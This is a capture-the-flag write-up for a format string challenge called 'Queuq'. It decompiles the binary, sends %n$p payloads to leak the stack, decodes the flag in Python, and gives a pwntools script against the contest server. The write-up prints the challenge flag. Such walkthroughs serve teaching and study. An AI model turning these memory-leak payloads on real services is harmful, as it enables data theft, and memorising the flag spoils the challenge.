# Queuq

Category: pwn
Requires: format string bug

(wasn't solved during event, this is just my proecdure after reading a few writeups)

ghidra, decompile `main`, reverse some variables:
```c
void main(void)

{
  __gid_t __rgid;
  FILE *__stream;
  long in_FS_OFFSET;
  char input [48];
  char flag [136];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  __stream = fopen("flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("Error: missing flag.txt.");
                    // WARNING: Subroutine does not return
    exit(1);
  }
  fgets(flag,128,__stream);
  printf("What did you learn in class today? ");
  fgets(input,48,stdin);
  printf("Oh nice, ");
  printf(input);
  printf("sounds pretty cool!");
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return;
}
```

since there is `fgets()` followed by `printf()` it is a FSB (Format string bug)

`%n$p` gets the nth argument on the stack as a **pointer**. (Wait, why is the flag encoded in the memory address? idk, did they forget to reference the value or smth???)

so we input this:
```
What did you learn in class today? %1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p %11$p %12$p %13$p %14$p %15$p %16$p %17$p %18$p %19$p %20$p
Oh nice, 0x7ffd8d06e960 (nil) (nil) (nil) (nil) 0x3e800000002 0x55d9978532a0 0x2432252070243125 0x2520702433252070 %1sounds pretty cool!
```
We get `0x2432252070243125 0x2520702433252070` as the "output". Converting this to little endian ascii:
```python
list = [0x2432252070243125, 0x2520702433252070]

flag = []

for l in list:
    l = hex(l)
    bytelen = len(l)-2
    if bytelen%2==1:
        l = '0'+l
    for i in range(1,bytelen,2):
        f = l[-i-1]+l[-i]
        f = int(f,16)
        flag.append(chr(f))
print(''.join(flag))
```

we get `%1$p %2$p %3$p %`, which is the original input (shouldn't be surprising, the `input` also stored on the stack). 
We keep removing format strings to prevent clogging the output until we get:
```
What did you learn in class today? %13$p %14$p %15$p %16$p %17$p %18$p %19$p %20$p
Oh nice, 0x70243032252070 0x3474737b66746361 0x75715f74695f6b63 0x615f74695f657565 0x3437396461393136 0x7d32326234363863 (nil) (nil)sounds pretty cool!
```
which becomes `p %20$pactf{st4ck_it_queue_it_a619ad974c864b22}`
Flag:
```
actf{st4ck_it_queue_it_a619ad974c864b22}`
```

Better script: [source](https://www.youtube.com/watch?v=jqF4Sgi4Ars)
```python
import pwn
import time
import warnings

elf = pwn.ELF('./queue')
pwn.context.binary = elf
pwn.context.log_level = "DEBUG"

libc = elf.libc

out=""
for i in range(14,19):
	# p = elf.process()
	p = pwn.remote('challs.actf.co','31322')
	p.sendlineafter(b"today?", f"%{i}$p")
	
	p.recvuntil('Oh nice, 0x')
	
	data = p.recvuntil('sounds', drop=True)
	out+=bytes.fromhex(data.decode()).decode()[::-1]
	p.close()
print(out)
```